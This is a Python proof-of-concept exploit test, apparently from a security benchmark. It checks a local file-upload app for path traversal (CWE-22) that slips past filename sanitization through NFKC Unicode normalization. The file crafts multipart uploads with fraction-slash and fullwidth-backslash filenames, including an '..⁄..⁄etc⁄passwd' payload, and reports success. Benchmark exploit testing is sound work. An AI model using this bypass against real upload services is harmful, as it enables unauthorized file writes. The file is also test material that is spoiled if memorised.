"""PoC exploit: Path traversal via NFKC Unicode normalization (CWE-22).

After the 3-stage chain:
- Stage 1 adds filename sanitization (strips .., /, \\, null bytes)
- Stage 2 adds NFD Unicode normalization for i18n filenames (safe)
- Stage 3 switches to NFKC normalization for "better compatibility"

The vulnerability: NFKC performs compatibility decomposition which maps
certain Unicode characters to their ASCII equivalents:
  U+2044 FRACTION SLASH -> U+002F SOLIDUS (/)
  U+FF3C FULLWIDTH REVERSE SOLIDUS -> U+005C REVERSE SOLIDUS (\\)

The sanitization pipeline applies NFKC normalization as Step 1, then
strips dangerous characters. However, the sanitization order creates a
bypass: the regex strips ".." and "/" separately, but NFKC can produce
NEW traversal sequences from previously-safe Unicode chars.

Attack: upload a file with Unicode fraction slashes (U+2044) in the
name. The sanitizer sees no ASCII "/" or ".." in the original string,
but after NFKC normalization, fraction slashes become real slashes.
"""

import uuid
import urllib.error
import urllib.parse
import urllib.request
import json

from mosaic.oracle.exploit import ExploitTest, RequestLog


class NfkcTraversalExploit(ExploitTest):
    """Path traversal via NFKC Unicode normalization bypassing filename sanitization."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "fileupload_filename_sanitization_bypass"

    def setup(self) -> None:
        """Verify the upload server is reachable.

        This mini-app only exposes POST upload endpoints and static uploads;
        a healthy baseline commonly returns HTTP 404 on GET /. Treat any
        non-5xx HTTP response as reachable, matching deploy health checks.
        """
        resp = self.http_get("/")
        if resp.status_code >= 500:
            raise ConnectionError(
                f"Upload server not reachable at {self.base_url}: HTTP {resp.status_code}"
            )

    def execute(self) -> tuple[bool, str]:
        """Upload files with Unicode chars that NFKC normalizes to dangerous sequences."""
        evidence_parts = []

        # U+2044 = FRACTION SLASH, which NFKC normalizes to / (U+002F)
        fraction_slash = "\u2044"

        # --- Test 1: Upload with fraction slash in filename ---
        # If NFKC is active, the fraction slash becomes a real slash
        # after normalization, which may bypass sanitization
        test_name_1 = f"test{fraction_slash}path.jpg"
        success_1, msg_1, resp_body_1 = self._upload_with_name(test_name_1)
        evidence_parts.append(f"[Test 1 - fraction slash]: {msg_1}")

        # Check if the response filename contains a real / (meaning NFKC
        # converted the fraction slash and sanitization didn't catch it,
        # OR the server processed it somehow)
        nfkc_active = False
        if success_1 and resp_body_1:
            # The saved filename in the response tells us what happened
            # If NFKC is active, the fraction slash was converted to /
            # which then gets stripped by sanitization -> "testpath.jpg"
            # If NFD is active, fraction slash stays as-is -> "test⁄path.jpg"
            try:
                data = json.loads(resp_body_1)
                payload = data.get("data", {})
                original_echo = payload.get("name", "")
                saved_name = payload.get("filename", "") or original_echo
                # With NFKC: fraction slash -> / -> stripped -> "testpath"
                # With NFD: fraction slash stays -> "test⁄path"
                if (
                    original_echo
                    and fraction_slash in original_echo
                    and fraction_slash not in saved_name
                    and "testpath" in saved_name
                ):
                    nfkc_active = True
                    evidence_parts.append(
                        f"[NFKC detected]: Fraction slash (U+2044) was normalized "
                        f"to ASCII /. Saved filename: {saved_name}"
                    )
            except (json.JSONDecodeError, AttributeError):
                pass

        # --- Test 2: Upload with traversal via fraction slashes ---
        # ".." + fraction_slash = after NFKC becomes "../"
        # But sanitization strips ".." first, then strips "/"
        # The key: if sanitization order is normalize->strip, NFKC runs first
        traversal_name = f"..{fraction_slash}..{fraction_slash}etc{fraction_slash}passwd.jpg"
        success_2, msg_2, resp_body_2 = self._upload_with_name(traversal_name)
        evidence_parts.append(f"[Test 2 - traversal]: {msg_2}")

        if success_2 and resp_body_2:
            try:
                data = json.loads(resp_body_2)
                payload = data.get("data", {})
                saved_name = payload.get("filename", "") or payload.get("name", "")
                # Only ASCII path separators count as a traversal confirmation
                # here. Clean baselines may legitimately echo the original
                # Unicode filename, including literal ".." segments.
                if "/" in saved_name or "\\" in saved_name:
                    evidence_parts.append(
                        f"[TRAVERSAL]: Path traversal chars survived in filename: {saved_name}"
                    )
            except (json.JSONDecodeError, AttributeError):
                pass

        # --- Test 3: Upload with fullwidth reverse solidus ---
        # U+FF3C FULLWIDTH REVERSE SOLIDUS -> \ via NFKC
        fullwidth_backslash = "\uff3c"
        test_name_3 = f"test{fullwidth_backslash}path.jpg"
        success_3, msg_3, resp_body_3 = self._upload_with_name(test_name_3)
        evidence_parts.append(f"[Test 3 - fullwidth backslash]: {msg_3}")

        # --- Determine overall result ---
        traversal_survived = any(
            marker in " | ".join(evidence_parts)
            for marker in ("[TRAVERSAL]:", "[NFKC detected]:")
        )

        if nfkc_active or traversal_survived:
            return True, (
                "Path traversal via NFKC normalization confirmed (CWE-22). "
                "The server uses NFKC Unicode normalization which converts "
                "U+2044 FRACTION SLASH to ASCII / (U+002F). An attacker can "
                "use Unicode fraction slashes in filenames to bypass the "
                "sanitization that strips ASCII directory separators. "
                "The normalization runs as part of the sanitization pipeline, "
                "creating new dangerous characters from safe Unicode input. "
                + " | ".join(evidence_parts)
            )

        return False, (
            "Path traversal via NFKC not confirmed. The server accepted the "
            "Unicode filenames, but did not show evidence that U+2044 or "
            "U+FF3C were normalized into ASCII path separators during upload. "
            + " | ".join(evidence_parts)
        )

    def _upload_with_name(
        self, filename: str
    ) -> tuple[bool, str, str]:
        """Upload a file with the given filename. Returns (success, message, response_body)."""
        boundary = f"----MosaicBoundary{uuid.uuid4().hex[:16]}"

        file_content = b"\xff\xd8\xff\xe0" + b"\x00" * 100

        body_parts = []
        body_parts.append(f"--{boundary}\r\n".encode())
        body_parts.append(
            f'Content-Disposition: form-data; name="avatar"; '
            f'filename="{filename}"\r\n'.encode("utf-8")
        )
        body_parts.append(b"Content-Type: image/jpeg\r\n")
        body_parts.append(b"\r\n")
        body_parts.append(file_content)
        body_parts.append(f"\r\n--{boundary}--\r\n".encode())

        body = b"".join(body_parts)

        url = f"{self.base_url}/upload-avatar"
        req = urllib.request.Request(
            url,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
            method="POST",
        )

        resp_body = ""
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                resp_body = resp.read().decode()
                status_code = resp.status
                self._request_logs.append(RequestLog(
                    method="POST",
                    url=url,
                    status_code=status_code,
                    request_body=f"<multipart: filename={filename!r}>",
                    response_body=resp_body[:2000],
                ))
        except urllib.error.HTTPError as e:
            resp_body = e.read().decode() if e.fp else ""
            status_code = e.code
            self._request_logs.append(RequestLog(
                method="POST",
                url=url,
                status_code=status_code,
                request_body=f"<multipart: filename={filename!r}>",
                response_body=resp_body[:2000],
            ))
        except urllib.error.URLError as e:
            return False, f"Connection failed: {e}", ""

        if status_code == 200:
            return True, (
                f"Upload accepted (HTTP 200). Filename: {filename!r}. "
                f"Response: {resp_body[:300]}"
            ), resp_body
        else:
            return False, f"HTTP {status_code}: {resp_body[:200]}", resp_body
